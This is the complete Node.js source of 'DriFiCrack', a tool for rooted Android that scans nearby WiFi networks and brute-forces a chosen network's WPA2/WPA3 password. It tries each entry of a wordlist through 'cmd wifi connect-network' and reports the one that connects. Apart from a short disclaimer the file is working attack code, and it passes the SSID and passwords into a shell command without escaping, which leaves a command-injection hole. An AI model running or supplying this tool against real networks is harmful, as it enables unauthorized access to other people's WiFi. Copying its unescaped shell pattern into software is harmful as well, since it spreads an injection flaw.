#!/usr/bin/node

/*
 * DriFiCrack - WiFi Password Cracking Tool
 * Copyright (c) 2025 ZeltNamizake
 *
 * Licensed under the MIT License.
 * You may obtain a copy of the License at:
 * https://opensource.org/licenses/MIT
 *
 * This tool is for educational purposes only.
 * Unauthorized use may violate local laws.
 * Use responsibly.
 */

const { exec } = require("child_process");
const readline = require("readline");
const fs = require("fs");

//Colors for terminal output
const G = `\x1b[32m`;
const C = `\x1b[36m`;
const R = `\x1b[31m`;
const Y = `\x1b[33m`;
const B = `\x1b[30m`;
const M = `\x1b[35m`;
const r = `\x1b[0m`;
const b = `\x1b[1m`;
const u = `\x1b[2m`;

//Arguments command line
const options = process.argv[2];
const ssid = process.argv[3];
const type = process.argv[4];

//information help
const information = `${b}${R}
            %-.                                   .++
            %@#-                                 -+@+
            #@@@-.                              +@@@+
            +@@@@*-       .-=========-.       =+@@@@+
            .@@@@@%=. .=++*@@@@@@@@@@%*++=   +@@@@@@+
             @@@@@@@*+*@@@@@@*======+#@@@@*++@@@@@@@+
             @@@@@@@@@@@%=---.       :---#@@@@@@@@@@+
             @@@@@@@@@+-:                .:-@@@@@@@@+
             *@@@@@%-:.                     ::@@@@@@+
             .@@@@=.                          .-@@@@+
             %@@%.         .*%@@@@@@%=          :*@@+
            %@@:        =%@@@@@@@@@@@@@@%.        =@*.
           #@@        +@@@@=           +@@@:       =@=
          #@@.      =@@@=                 #@@.      =@=
         +@%.     :#@%=                     %%*.     =@-
        .#%.     -@@+            .           .#%.     ++.
        +%:     -@%=        :--==+----.        #%:     *-
       :+:     .@*:      .-=#***+==+**+-:      .##.    -+.
       ==      *+.      :+*+-         :++=      .*=     =.
       ::     -#       :#*.             :=+      .+:     .
      ..      %:      :+=.                -+      :-     =
      ..      -      :=:                   -=      .     .
             -       :-                     :      ..
             .       .         ####=
                              %@@@@@+
                             %@@@@@@@=
                             @@@@@@@@+
                            =@@@@@@@@*.
                             @@@@@@@@*.
                             @@@@@@@@+
                             *@@@@@@%-
                              *#@@@#=
                                **=${r}

${b}DriFiCrack 1.0.1 ( https://github.com/ZeltNamizake/DriFiCrack )${r}
Disclaimer:${u} DriFiCrack should only be used for legitimate purposes and only on WiFi
networks that you have permission to access. Using this tool to try to hack a WiFi
network without permission is illegal and violates other people's privacy.${r}

Usage: ./drificrack [OPTIONS]

OPTIONS:
  --help                     Print help information
  --scan                     Scan available WiFi networks
  --crack <ssid> <type>      Crack WiFi password (type = wpa2|wpa3)

EXAMPLES:
  ./drificrack --scan
  ./drificrack --crack MySSID wpa2`;

//function delay
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

//function checkUser root
function checkUser() {
    return new Promise(resolve => {
        exec(`whoami`, (error, stdout, stderr) => {
            if (error) return console.log(error);
            if (stderr) return console.log(stderr);
            if (stdout.startsWith("root")) {
                resolve(true);
            } else {
                console.log(`[!] DriFiCrack requires access ${b}root${r}.`);
                resolve(false);
            }
        });
    });
}

//function check status wifi enabled or disabled
function checkStatusWifi() {
    return new Promise(resolve => {
        exec(`cmd wifi status`, (error, stdout, stderr) => {
            if (error) return console.log(error);
            if (stderr) return console.log(stderr);
            if (stdout.startsWith("Wifi is enabled")) {
                resolve(true);
            } else if (stdout.startsWith("Wifi is disabled")) {
                console.log(
                    `[!] Wifi is ${R}${b}disabled${r}. Please try enabling.`
                );
                resolve(false);
            }
        });
    });
}

//function check status wifi if connected
function checkStatusWifiConnected() {
    return new Promise(resolve => {
        exec(`cmd wifi status`, (error, stdout, stderr) => {
            if (error) return console.log(error);
            if (stderr) return console.log(stderr);
            if (stdout.includes("WifiInfo:")) {
                resolve(true);
            } else if (stdout.includes("Wifi is not connected")) {
                resolve(false);
            }
        });
    });
}

// Function scan wifi
function scanWifi() {
    exec(
        `cmd wifi start-scan && cmd wifi list-scan-results`,
        (error, stdout, stderr) => {
            if (error) return console.log(error);
            if (stderr) return console.log(stderr);

            const lines = stdout.trim().split("\n").filter(Boolean);
            const dataLines = lines.slice(1);
            let result = "";
            let SSID = [];
            dataLines.forEach(line => {
                const fixedLine = line.replace(/\s+/g, "|").trim();
                const parts = fixedLine.split("|").filter(Boolean);

                if (parts.length >= 5) {
                    const bssid = parts[0];
                    const frequency = parts[1];
                    const ssid = parts.slice(4, parts.length - 1).join(" ");
                    const flagsRaw = parts[parts.length - 1];
                    result += `\n---------------------------------------------------------------\n|BSSID: ${b}${bssid}${r}\n|Frequency: ${b}${frequency}${r}\n|SSID: ${b}${ssid}${r}\n|Security: ${b}${flagsRaw}${r}\n---------------------------------------------------------------\n`;
                    SSID.push(ssid);
                }
            });

            if (result.length > 0) {
                console.log(
                    `[+] Scan results:\n${result}\nFound: ${b}${G}${SSID.length}${r}`
                );
            } else {
                console.log(
                    `[-] No scan results found ${b}${R}${SSID.length}${r}.`
                );
            }
        }
    );
}

// function connect to a specific WiFi network using a password
function connectWifi(ssid, type, pass) {
    return new Promise((resolve, reject) => {
        exec(
            `cmd wifi connect-network "${ssid}" "${type}" "${pass}"`,
            (error, stdout, stderr) => {
                if (error || stderr) return reject(error || stderr);
                resolve(stdout);
            }
        );
    });
}

//function cracking password wifi
async function crackingPassword(ssid, type) {
    if (!fs.existsSync("wordlist.txt")) {
        console.log(`${u}[!] wordlist.txt not found.${r}`);
        process.exit(1);
    }

    const wordlist = fs
        .readFileSync(`wordlist.txt`, `utf8`)
        .trim()
        .split("\n")
        .filter(Boolean);

    console.log(
        `[+] Starting crack SSID: ${b}${ssid}${r}, Type: ${b}${type}${r} with ${b}${G}${wordlist.length}${r} password:`
    );
    for (const pass of wordlist) {
        try {
            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`${u}[*] Trying password ${b}${Y}${pass}${r}`);
            await connectWifi(ssid, type, pass);
            await delay(4000);
            const statusConnected = await checkStatusWifiConnected();
            if (statusConnected) {
                readline.clearLine(process.stdout, 0);
                readline.cursorTo(process.stdout, 0);
                process.stdout.write(
                    `\r[+] Connected to ${b}${ssid}${r} with pass ${b}${G}${pass}${r}`
                );
                break;
            } else {
                readline.clearLine(process.stdout, 0);
                readline.cursorTo(process.stdout, 0);
                process.stdout.write(
                    `\r${u}[-] Invalid Password ${b}${R}${pass}${r}`
                );
            }
        } catch (e) {
            return console.log(
                `\n${R}Failed trying password: ${e.message}${r}`
            );
        }
        await delay(5000);
    }

    console.log(`\nFinished.`);
}

//function for startDriFiCrack
async function startDriFiCrack() {
    const user = await checkUser();
    if (user) {
        const wifiON = await checkStatusWifi();
        if (wifiON) {
            switch (options) {
                case "--scan":
                    scanWifi();
                    break;
                case "--crack":
                    if (ssid && (type === "wpa2" || type === "wpa3")) {
                        crackingPassword(ssid, type);
                    } else {
                        console.log(
                            `[!] Usage: ./drificrack --crack <SSID> <wpa2|wpa3>`
                        );
                    }
                    break;
                case "--help":
                    console.log(information);
                    break;
                default:
                    console.log(
                        `[!] Invalid option. Use ${b}./drificrack --help${r} for more info.`
                    );
            }
        }
    }
}
startDriFiCrack();
